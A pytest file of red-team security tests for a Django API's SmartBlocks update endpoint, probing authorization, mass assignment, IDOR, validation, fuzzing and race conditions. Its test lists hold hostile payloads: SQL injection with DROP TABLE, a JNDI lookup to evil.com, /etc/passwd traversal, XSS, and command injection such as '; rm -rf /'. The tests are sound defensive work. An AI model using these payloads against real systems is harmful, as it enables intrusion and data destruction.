"""Red Team security tests for SmartBlocks UPDATE endpoint (T236).

Tests focus on:
- API1:2023 BOLA (updating other users' blocks)
- API3:2023 BOPLA (mass assignment via PATCH/PUT)
- IDOR via path parameter manipulation
- Race conditions in concurrent updates
- Injection attacks in update payloads
"""

import concurrent.futures
import json

import pytest

from model_bakery import baker

from api.core.models import User
from api.schedule.models import SmartBlock


@pytest.mark.django_db(transaction=True)
class TestSmartBlockUpdateRedTeam:
    """Red Team tests for PATCH/PUT /api/v2/smart-blocks/{id}."""

    def setup_method(self):
        """Clean up before each test."""
        SmartBlock.objects.all().delete()
        User.objects.filter(username__startswith="testred").delete()

    # ========================================================================
    # API1:2023 - BOLA (Broken Object Level Authorization)
    # ========================================================================

    @pytest.mark.xfail(
        reason="T434: BOLA - can update other user's block via PATCH",
    )
    def test_bola_patch_other_users_block(self, api_client):
        """BOLA: Attacker should NOT be able to PATCH victim's block."""
        victim = baker.make(User, username="testred_victim")
        attacker = baker.make(User, username="testred_attacker")

        victim_block = baker.make(
            SmartBlock,
            name="Victim Block",
            kind=SmartBlock.Kind.STATIC,
            owner=victim,
        )

        # Attacker tries to update victim's block
        response = api_client.patch(
            f"/api/v2/smart-blocks/{victim_block.id}",
            json.dumps({"name": "Hacked by Attacker"}),
            content_type="application/json",
        )

        assert (
            response.status_code == 403
        ), f"BOLA: Attacker can PATCH victim's block (got {response.status_code})"

    @pytest.mark.xfail(
        reason="T435: BOLA - can update other user's block via PUT",
    )
    def test_bola_put_other_users_block(self, api_client):
        """BOLA: Attacker should NOT be able to PUT victim's block."""
        victim = baker.make(User, username="testred_victim")
        attacker = baker.make(User, username="testred_attacker")

        victim_block = baker.make(
            SmartBlock,
            name="Victim Block",
            kind=SmartBlock.Kind.STATIC,
            owner=victim,
        )

        response = api_client.put(
            f"/api/v2/smart-blocks/{victim_block.id}",
            json.dumps(
                {
                    "name": "Hacked Block",
                    "kind": SmartBlock.Kind.DYNAMIC,
                },
            ),
            content_type="application/json",
        )

        assert (
            response.status_code == 403
        ), f"BOLA: Attacker can PUT victim's block (got {response.status_code})"

    def test_validation_put_null_required_fields(self, api_client):
        """Validation: PUT with null for required fields should fail.

        BUG T443: Currently returns 200 instead of 400.
        """
        user = baker.make(User, username="testred_user")
        block = baker.make(
            SmartBlock,
            name="Block",
            kind=SmartBlock.Kind.STATIC,
            owner=user,
        )

        response = api_client.put(
            f"/api/v2/smart-blocks/{block.id}",
            json.dumps({"name": None, "kind": None}),
            content_type="application/json",
        )

        # BUG: Currently returns 200, should return 400
        assert (
            response.status_code == 400
        ), f"BUG T443: PUT with null fields accepted (got {response.status_code})"

    @pytest.mark.xfail(
        reason="T443: PUT with null required fields returns 200 instead of 400",
    )
    def test_validation_put_null_required_fields_xfail(self, api_client):
        """Documenting actual buggy behavior for T443."""
        user = baker.make(User, username="testred_user")
        block = baker.make(
            SmartBlock,
            name="Block",
            kind=SmartBlock.Kind.STATIC,
            owner=user,
        )

        response = api_client.put(
            f"/api/v2/smart-blocks/{block.id}",
            json.dumps({"name": None, "kind": None}),
            content_type="application/json",
        )

        # This documents current buggy behavior (returns 200)
        assert response.status_code == 200

    # ========================================================================
    # API3:2023 - BOPLA (Mass Assignment via PATCH/PUT)
    # ========================================================================

    def test_secure_id_cannot_be_changed_via_patch(self, api_client):
        """Security: Block id cannot be changed via PATCH (Django protects id)."""
        user = baker.make(User, username="testred_user")
        block = baker.make(
            SmartBlock,
            name="Block",
            kind=SmartBlock.Kind.STATIC,
            owner=user,
        )
        original_id = block.id

        response = api_client.patch(
            f"/api/v2/smart-blocks/{block.id}",
            json.dumps({"id": 99999}),
            content_type="application/json",
        )

        # Django/DRF properly ignores or rejects id changes
        if response.status_code == 200:
            data = response.json()
            assert (
                data.get("id") == original_id
            ), "CRITICAL: Block id was changed via PATCH!"
        # If 400, that's also acceptable (rejected)

    @pytest.mark.xfail(
        reason="T438: BOPLA - can change owner via PATCH (account hijacking)",
    )
    def test_bopla_patch_change_owner(self, api_client):
        """BOPLA: Should NOT be able to change owner (block hijacking)."""
        user = baker.make(User, username="testred_user")
        other_user = baker.make(User, username="testred_other")
        block = baker.make(
            SmartBlock,
            name="Block",
            kind=SmartBlock.Kind.STATIC,
            owner=user,
        )

        response = api_client.patch(
            f"/api/v2/smart-blocks/{block.id}",
            json.dumps({"owner": other_user.id}),
            content_type="application/json",
        )

        if response.status_code == 200:
            data = response.json()
            assert (
                data.get("owner") == user.id
            ), "BOPLA: Block owner was changed (block hijacked)"

    @pytest.mark.xfail(
        reason="T439: BOPLA - can backdate created_at via PATCH",
    )
    def test_bopla_patch_backdate_created_at(self, api_client):
        """BOPLA: Should NOT be able to manipulate created_at."""
        user = baker.make(User, username="testred_user")
        block = baker.make(
            SmartBlock,
            name="Block",
            kind=SmartBlock.Kind.STATIC,
            owner=user,
        )

        response = api_client.patch(
            f"/api/v2/smart-blocks/{block.id}",
            json.dumps({"created_at": "2010-01-01T00:00:00Z"}),
            content_type="application/json",
        )

        if response.status_code == 200:
            data = response.json()
            original_created = (
                block.created_at.isoformat() if block.created_at else None
            )
            assert "2010" not in str(
                data.get("created_at", ""),
            ), "BOPLA: created_at was backdated"

    @pytest.mark.xfail(
        reason="T440: BOPLA - can set future updated_at via PATCH",
    )
    def test_bopla_patch_future_updated_at(self, api_client):
        """BOPLA: Should NOT be able to set future updated_at."""
        user = baker.make(User, username="testred_user")
        block = baker.make(
            SmartBlock,
            name="Block",
            kind=SmartBlock.Kind.STATIC,
            owner=user,
        )

        response = api_client.patch(
            f"/api/v2/smart-blocks/{block.id}",
            json.dumps({"updated_at": "2035-12-31T23:59:59Z"}),
            content_type="application/json",
        )

        if response.status_code == 200:
            data = response.json()
            assert "2035" not in str(
                data.get("updated_at", ""),
            ), "BOPLA: updated_at set to future date"

    @pytest.mark.xfail(
        reason="T441: BOPLA - can change kind in unexpected ways",
    )
    def test_bopla_patch_invalid_kind_values(self, api_client):
        """BOPLA: Should validate kind field properly."""
        user = baker.make(User, username="testred_user")
        block = baker.make(
            SmartBlock,
            name="Block",
            kind=SmartBlock.Kind.STATIC,
            owner=user,
        )

        invalid_kinds = [
            None,
            "",
            "invalid",
            "STATIC",  # wrong case
            123,
            {"kind": "static"},
        ]

        for kind in invalid_kinds:
            response = api_client.patch(
                f"/api/v2/smart-blocks/{block.id}",
                json.dumps({"kind": kind}),
                content_type="application/json",
            )
            # Should either reject or keep original value
            if response.status_code == 200:
                data = response.json()
                assert data.get("kind") in [
                    SmartBlock.Kind.STATIC,
                    SmartBlock.Kind.DYNAMIC,
                ], f"BOPLA: Invalid kind '{kind}' was accepted"

    # ========================================================================
    # IDOR - ID Manipulation
    # ========================================================================

    def test_idor_negative_id(self, api_client):
        """IDOR: Negative ID should return 404, not crash."""
        response = api_client.patch(
            "/api/v2/smart-blocks/-1",
            json.dumps({"name": "Test"}),
            content_type="application/json",
        )
        assert response.status_code in [
            404,
            400,
        ], f"Negative ID returned {response.status_code}"

    def test_idor_zero_id(self, api_client):
        """IDOR: Zero ID should return 404."""
        response = api_client.patch(
            "/api/v2/smart-blocks/0",
            json.dumps({"name": "Test"}),
            content_type="application/json",
        )
        assert (
            response.status_code == 404
        ), f"Zero ID returned {response.status_code}"

    def test_idor_sql_injection_in_path(self, api_client):
        """IDOR: SQL injection in path parameter."""
        sqli_ids = [
            "1' OR '1'='1",
            "1; DROP TABLE cc_block;--",
            "1 UNION SELECT * FROM users",
            "${jndi:ldap://evil.com}",
        ]

        for bad_id in sqli_ids:
            response = api_client.patch(
                f"/api/v2/smart-blocks/{bad_id}",
                json.dumps({"name": "Test"}),
                content_type="application/json",
            )
            # Should not crash with 500
            assert response.status_code in [
                404,
                400,
            ], f"SQLi in path '{bad_id}' caused {response.status_code}"

    def test_idor_path_traversal(self, api_client):
        """IDOR: Path traversal attempts."""
        traversal_paths = [
            "../../../etc/passwd",
            "..%2f..%2f..%2fetc%2fpasswd",
            "....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        ]

        for path in traversal_paths:
            response = api_client.patch(
                f"/api/v2/smart-blocks/{path}",
                json.dumps({"name": "Test"}),
                content_type="application/json",
            )
            assert response.status_code in [
                404,
                400,
            ], f"Path traversal caused {response.status_code}"

    # ========================================================================
    # Injection Attacks in Update Payload
    # ========================================================================

    def test_injection_xss_in_name_update(self, api_client):
        """Injection: XSS payloads in name update."""
        user = baker.make(User, username="testred_user")
        block = baker.make(
            SmartBlock,
            name="Block",
            kind=SmartBlock.Kind.STATIC,
            owner=user,
        )

        xss_payloads = [
            "<script>alert('xss')</script>",
            "<img src=x onerror=alert('xss')>",
            "javascript:alert('xss')",
            "<svg onload=alert('xss')>",
            "' onclick='alert(1)",
        ]

        for payload in xss_payloads:
            response = api_client.patch(
                f"/api/v2/smart-blocks/{block.id}",
                json.dumps({"name": payload}),
                content_type="application/json",
            )
            # Should handle gracefully
            assert response.status_code in [
                200,
                400,
            ], f"XSS payload caused {response.status_code}"

    def test_injection_sql_in_description_update(self, api_client):
        """Injection: SQLi in description field."""
        user = baker.make(User, username="testred_user")
        block = baker.make(
            SmartBlock,
            name="Block",
            kind=SmartBlock.Kind.STATIC,
            owner=user,
        )

        sqli_payloads = [
            "'; DROP TABLE cc_block;--",
            "' UNION SELECT * FROM cc_user--",
            "${jndi:ldap://evil.com}",
            "'; DELETE FROM cc_block WHERE '1'='1",
        ]

        for payload in sqli_payloads:
            response = api_client.patch(
                f"/api/v2/smart-blocks/{block.id}",
                json.dumps({"description": payload}),
                content_type="application/json",
            )
            # Should not crash with 500
            assert response.status_code in [
                200,
                400,
            ], f"SQLi payload caused {response.status_code}"

    def test_injection_command_in_name(self, api_client):
        """Injection: Command injection attempts."""
        user = baker.make(User, username="testred_user")
        block = baker.make(
            SmartBlock,
            name="Block",
            kind=SmartBlock.Kind.STATIC,
            owner=user,
        )

        cmd_payloads = [
            "$(whoami)",
            "`id`",
            "| cat /etc/passwd",
            "; rm -rf /",
            "&& echo pwned",
        ]

        for payload in cmd_payloads:
            response = api_client.patch(
                f"/api/v2/smart-blocks/{block.id}",
                json.dumps({"name": payload}),
                content_type="application/json",
            )
            assert response.status_code in [
                200,
                400,
            ], f"Command injection caused {response.status_code}"

    # ========================================================================
    # Race Conditions
    # ========================================================================

    def test_concurrent_patch_same_block(self, api_client):
        """Stress: Concurrent PATCH on same block - Django handles concurrency well.

        NOTE: This test verifies that the system handles concurrent updates without
        data corruption. Last-write-wins is acceptable behavior.
        """
        user = baker.make(User, username="testred_user")
        block = baker.make(
            SmartBlock,
            name="Original",
            kind=SmartBlock.Kind.STATIC,
            owner=user,
        )

        results = []
        names = ["Update1", "Update2", "Update3", "Update4", "Update5"]

        def patch_block(name):
            response = api_client.patch(
                f"/api/v2/smart-blocks/{block.id}",
                json.dumps({"name": name}),
                content_type="application/json",
            )
            return (
                response.json().get("name")
                if response.status_code == 200
                else None
            )

        # Fire concurrent updates
        with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
            futures = [executor.submit(patch_block, name) for name in names]
            results = [
                f.result() for f in concurrent.futures.as_completed(futures)
            ]

        # All updates should succeed
        valid_results = [r for r in results if r is not None]
        assert (
            len(valid_results) == 5
        ), f"Expected 5 successful updates, got {len(valid_results)}"

        # Final state should be one of our updates (no corruption)
        final_block = SmartBlock.objects.get(id=block.id)
        assert (
            final_block.name in names
        ), f"Data corruption: final name '{final_block.name}' not in valid updates"

    # ========================================================================
    # HTTP Attacks
    # ========================================================================

    def test_http_method_override_on_patch(self, api_client):
        """HTTP: Method override header on PATCH."""
        user = baker.make(User, username="testred_user")
        block = baker.make(
            SmartBlock,
            name="Block",
            kind=SmartBlock.Kind.STATIC,
            owner=user,
        )

        response = api_client.patch(
            f"/api/v2/smart-blocks/{block.id}",
            json.dumps({"name": "Hacked"}),
            content_type="application/json",
            HTTP_X_HTTP_METHOD_OVERRIDE="DELETE",
        )
        # Should not delete the block
        assert response.status_code in [
            200,
            400,
            405,
        ], f"Method override caused {response.status_code}"

    def test_http_patch_with_query_params(self, api_client):
        """HTTP: PATCH with unexpected query parameters."""
        user = baker.make(User, username="testred_user")
        block = baker.make(
            SmartBlock,
            name="Block",
            kind=SmartBlock.Kind.STATIC,
            owner=user,
        )

        response = api_client.patch(
            f"/api/v2/smart-blocks/{block.id}?name=Injected&kind=dynamic",
            json.dumps({"name": "Valid Update"}),
            content_type="application/json",
        )

        if response.status_code == 200:
            data = response.json()
            # Query params should NOT override body
            assert (
                data.get("name") == "Valid Update"
            ), "Query params leaked into update"

    # ========================================================================
    # Validation Bypass
    # ========================================================================

    def test_validation_patch_empty_name_variations(self, api_client):
        """Validation: Various empty name attempts via PATCH."""
        user = baker.make(User, username="testred_user")
        block = baker.make(
            SmartBlock,
            name="Block",
            kind=SmartBlock.Kind.STATIC,
            owner=user,
        )

        empty_names = [
            "",
            " ",
            "   ",
            "\t",
            "\n",
            "\t\n\r ",
            "\u00a0",  # Non-breaking space
            "\u2000",  # En quad
            "\u2003",  # Em space
            "\u3000",  # Ideographic space
        ]

        for name in empty_names:
            response = api_client.patch(
                f"/api/v2/smart-blocks/{block.id}",
                json.dumps({"name": name}),
                content_type="application/json",
            )
            assert (
                response.status_code == 400
            ), f"Empty name '{repr(name)}' accepted via PATCH"

    def test_validation_patch_name_too_long(self, api_client):
        """Validation: Extremely long name via PATCH."""
        user = baker.make(User, username="testred_user")
        block = baker.make(
            SmartBlock,
            name="Block",
            kind=SmartBlock.Kind.STATIC,
            owner=user,
        )

        response = api_client.patch(
            f"/api/v2/smart-blocks/{block.id}",
            json.dumps({"name": "X" * 10000}),
            content_type="application/json",
        )
        assert response.status_code in [
            400,
            413,
        ], f"Long name accepted via PATCH: {response.status_code}"

    def test_validation_patch_null_name(self, api_client):
        """Validation: Null name via PATCH should fail."""
        user = baker.make(User, username="testred_user")
        block = baker.make(
            SmartBlock,
            name="Block",
            kind=SmartBlock.Kind.STATIC,
            owner=user,
        )

        response = api_client.patch(
            f"/api/v2/smart-blocks/{block.id}",
            json.dumps({"name": None}),
            content_type="application/json",
        )
        assert (
            response.status_code == 400
        ), f"Null name accepted via PATCH: {response.status_code}"

    def test_validation_patch_with_only_id(self, api_client):
        """Validation: PATCH with only id should not change anything."""
        user = baker.make(User, username="testred_user")
        block = baker.make(
            SmartBlock,
            name="Original",
            kind=SmartBlock.Kind.STATIC,
            owner=user,
        )

        response = api_client.patch(
            f"/api/v2/smart-blocks/{block.id}",
            json.dumps({"id": 99999}),
            content_type="application/json",
        )

        # Should either reject or ignore
        if response.status_code == 200:
            data = response.json()
            assert (
                data.get("name") == "Original"
            ), "PATCH with only id changed other fields"

    # ========================================================================
    # Fuzzing
    # ========================================================================

    def test_fuzzing_naughty_strings_in_patch(self, api_client):
        """Fuzzing: SecLists naughty strings in PATCH."""
        user = baker.make(User, username="testred_user")
        block = baker.make(
            SmartBlock,
            name="Block",
            kind=SmartBlock.Kind.STATIC,
            owner=user,
        )

        naughty_strings = [
            "undefined",
            "null",
            "None",
            "NULL",
            "nil",
            "[]",
            "{}",
            "[object Object]",
            "NaN",
            "Infinity",
            "-Infinity",
            "true",
            "false",
            "True",
            "False",
            "{{7*7}}",
            "<%= 7*7 %>",
            "${7*7}",
            "__proto__",
            "constructor",
            "prototype",
        ]

        for string in naughty_strings:
            response = api_client.patch(
                f"/api/v2/smart-blocks/{block.id}",
                json.dumps({"name": string}),
                content_type="application/json",
            )
            assert response.status_code in [
                200,
                400,
            ], f"Naughty string '{string}' caused {response.status_code}"

    def test_fuzzing_unicode_normalization(self, api_client):
        """Fuzzing: Unicode normalization attacks."""
        user = baker.make(User, username="testred_user")
        block = baker.make(
            SmartBlock,
            name="Block",
            kind=SmartBlock.Kind.STATIC,
            owner=user,
        )

        # Different unicode representations of similar chars
        unicode_variants = [
            "café",  # NFC
            "café",  # NFD (e + combining acute)
            "ℂℴ𝒻𝒻𝑒𝑒",  # Mathematical alphanumeric
            "𝐜𝐨𝐟𝐟𝐞𝐞",  # Bold
            "𝚌𝚘𝚏𝚏𝚎𝚎",  # Monospace
        ]

        for variant in unicode_variants:
            response = api_client.patch(
                f"/api/v2/smart-blocks/{block.id}",
                json.dumps({"name": variant}),
                content_type="application/json",
            )
            assert response.status_code in [
                200,
                400,
            ], f"Unicode variant caused {response.status_code}"

    # ========================================================================
    # JSON Attacks
    # ========================================================================

    def test_json_deep_nesting_in_patch(self, api_client):
        """JSON: Deeply nested structure in PATCH."""
        user = baker.make(User, username="testred_user")
        block = baker.make(
            SmartBlock,
            name="Block",
            kind=SmartBlock.Kind.STATIC,
            owner=user,
        )

        # Create deeply nested JSON
        nested = {"name": "Test"}
        for _ in range(50):
            nested = {"nested": nested}

        response = api_client.patch(
            f"/api/v2/smart-blocks/{block.id}",
            json.dumps(nested),
            content_type="application/json",
        )
        assert response.status_code in [
            200,
            400,
            413,
        ], f"Deep nesting caused {response.status_code}"

    def test_json_array_instead_of_object(self, api_client):
        """JSON: Array instead of object in PATCH."""
        user = baker.make(User, username="testred_user")
        block = baker.make(
            SmartBlock,
            name="Block",
            kind=SmartBlock.Kind.STATIC,
            owner=user,
        )

        response = api_client.patch(
            f"/api/v2/smart-blocks/{block.id}",
            json.dumps([{"name": "Test"}]),
            content_type="application/json",
        )
        assert response.status_code in [
            400,
            415,
        ], f"Array body accepted: {response.status_code}"

    def test_json_duplicate_keys_in_patch(self, api_client):
        """JSON: Duplicate keys behavior in PATCH."""
        user = baker.make(User, username="testred_user")
        block = baker.make(
            SmartBlock,
            name="Block",
            kind=SmartBlock.Kind.STATIC,
            owner=user,
        )

        # Raw JSON with duplicate keys
        response = api_client.patch(
            f"/api/v2/smart-blocks/{block.id}",
            '{"name": "First", "name": "Second"}',
            content_type="application/json",
        )
        # Should handle gracefully
        assert response.status_code in [
            200,
            400,
        ], f"Duplicate keys caused {response.status_code}"
